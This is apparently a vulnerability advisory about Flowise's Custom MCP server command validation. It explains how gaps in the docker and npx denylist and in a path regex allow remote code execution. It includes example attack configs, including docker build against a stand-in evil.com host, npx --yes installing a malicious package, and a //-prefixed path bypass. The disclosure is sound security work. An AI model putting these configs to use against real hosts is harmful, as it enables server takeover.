title: Flowise Custom MCP server command blocklist incomplete, allowing docker build / npx --yes / node // path RCE
description: In validateCommandFlags() (and the companion validateArgsForLocalFileAccess()) in packages/components/nodes/tools/MCP/core.ts, Flowise tries to restrict which command + argv a Custom MCP Server node may spawn using a per-command denylist (dangerousFlagsByCommand). The denylist is incomplete: for docker it blocks run/exec/-v/--privileged/etc. but not build/compose/--mount/--device/--entrypoint, so an attacker-supplied config {"command":"docker","args":["build","https://evil.com/"]} passes validation and docker build <remote-url> fetches and executes a remote Dockerfile (RUN). For npx it blocks the short -y but not the long alias --yes, so {"command":"npx","args":["--yes","<malicious-pkg>"]} auto-installs and runs an arbitrary package. Separately, validateArgsForLocalFileAccess uses the regex /^\/[^/]/ which matches /etc/passwd but not //path, so a node argv beginning with // (e.g. //root/.flowise/storage/.../cmd.js) bypasses the absolute-path check and node loads/executes a local attacker-written file. Any user able to configure a Custom MCP node (any role, or an API with chatflow view+update) can thereby achieve remote code execution on the Flowise host when the command is later spawned for a prediction.
